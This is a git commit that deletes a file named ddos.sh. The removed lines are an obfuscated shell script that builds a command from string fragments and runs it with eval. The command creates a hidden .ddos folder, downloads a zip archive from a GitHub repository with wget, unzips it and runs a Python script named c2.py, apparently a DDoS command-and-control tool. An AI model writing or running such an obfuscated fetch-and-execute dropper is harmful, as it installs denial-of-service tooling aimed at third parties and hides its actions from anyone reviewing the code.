adc0de7f4ae40b40a57a19aa787565a0d0f556ed
GH057_FR34K <129527618+GH057FR34K@users.noreply.github.com>
2023-04-22 01:18:49 +0530

    Delete ddos.sh

--- ddos.sh
+++
@@ -1,4 +0,0 @@
-#GH057_FR34K
-z="
-";Yz='riv8';Fz='os &';Gz='& rm';mz=' && ';gz='r';oz='rf .';Qz='//gi';qz='.zip';Zz='tool';fz='clea';dz='dos.';Sz='.com';Kz='.ddo';cz='n/.d';tz='c2.p';Rz='thub';pz='ddos';Bz='. &&';uz='y';bz='/mai';lz='lear';Hz=' -rf';Wz='11/d';Dz='-rf ';rz='pyth';kz='&& c';nz='rm -';Az='cd .';Pz='tps:';Cz=' rm ';Xz='dosp';sz='on3 ';ez='zip';jz='zip ';iz='p .d';az='/raw';Iz='& mk';Oz='t ht';Vz='eak1';Uz='stfr';Jz='dir ';Mz=' cd ';Nz=' wge';Lz='s &&';hz='unzi';Ez=' .dd';Tz='/gho';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Ez$Fz$Iz$Jz$Kz$Lz$Mz$Kz$Lz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$z$hz$iz$dz$jz$kz$lz$mz$nz$oz$pz$qz$mz$rz$sz$tz$uz"
